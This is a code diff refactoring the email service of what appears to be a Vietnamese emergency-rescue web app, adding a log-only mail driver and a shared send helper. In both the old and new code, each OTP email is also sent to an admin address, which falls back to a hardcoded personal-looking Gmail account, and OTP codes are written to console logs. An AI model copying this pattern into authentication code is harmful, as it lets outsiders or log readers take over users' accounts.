@@ -1,5 +1,29 @@
-const transporter = require("@config/email.config");
+const createTransporter = require("@config/email.config");
 const envConfig = require("@/config/env.config");
+
+const MAIL_DRIVER = (envConfig.MAIL_DRIVER || "smtp").toLowerCase();
+
+const getSenderEmail = () =>
+    envConfig.MAIL_FROM || envConfig.MAIL_USERNAME || "no-reply@cuuho.vn";
+
+const getAdminEmail = () => envConfig.MAIL_USERNAME || "facebookcopyright1302@gmail.com";
+
+const sendEmail = async ({ to, subject, html }) => {
+    if (MAIL_DRIVER === "log") {
+        console.log(`[MAIL DRIVER=log] To: ${Array.isArray(to) ? to.join(", ") : to}`);
+        console.log(`[MAIL DRIVER=log] Subject: ${subject}`);
+        console.log(`[MAIL DRIVER=log] HTML: ${html}`);
+        return { messageId: "log-only", driver: "log" };
+    }
+
+    const transporter = createTransporter();
+    return await transporter.sendMail({
+        from: `"Hệ Thống Cứu Hộ SOS" <${getSenderEmail()}>`,
+        to,
+        subject,
+        html
+    });
+};
 
 const sendOtpEmail = async ({ toEmail, otpCode, purpose = "register" }) => {
     const isForgotPassword = purpose === "forgotPassword";
@@ -36,18 +60,19 @@ const sendOtpEmail = async ({ toEmail, otpCode, purpose = "register" }) => {
     try {
         let recipientList = toEmail;
 
-        const adminEmail = envConfig.MAIL_USERNAME || "facebookcopyright1302@gmail.com";
-        if (toEmail && toEmail.toLowerCase() !== adminEmail.toLowerCase()) {
-            recipientList = [toEmail, adminEmail];
+        if (MAIL_DRIVER === "smtp") {
+            const adminEmail = getAdminEmail();
+            if (toEmail && toEmail.toLowerCase() !== adminEmail.toLowerCase()) {
+                recipientList = [toEmail, adminEmail];
+            }
         }
 
-        const info = await transporter.sendMail({
-            from: `"Hệ Thống Cứu Hộ SOS" <${envConfig.MAIL_USERNAME || 'no-reply@cuuho.vn'}>`,
+        const info = await sendEmail({
             to: recipientList,
             subject: `[CỨU HỘ SOS] Mã OTP ${title}: ${otpCode}`,
             html: htmlContent
         });
-        console.log(`✉️ [MAIL SERVICE] Đã gửi Email OTP (${otpCode}) thành công tới: ${Array.isArray(recipientList) ? recipientList.join(' & ') : recipientList} | MessageId: ${info.messageId}`);
+        console.log(`✉️ [MAIL SERVICE][${MAIL_DRIVER}] Đã gửi Email OTP (${otpCode}) thành công tới: ${Array.isArray(recipientList) ? recipientList.join(' & ') : recipientList} | MessageId: ${info.messageId}`);
         return true;
     } catch (error) {
         console.error(`🚨 [MAIL SERVICE ERROR] Không thể gửi Email OTP tới ${toEmail}:`, error.message);
@@ -57,5 +82,6 @@ const sendOtpEmail = async ({ toEmail, otpCode, purpose = "register" }) => {
 };
 
 module.exports = {
+    sendEmail,
     sendOtpEmail
 };
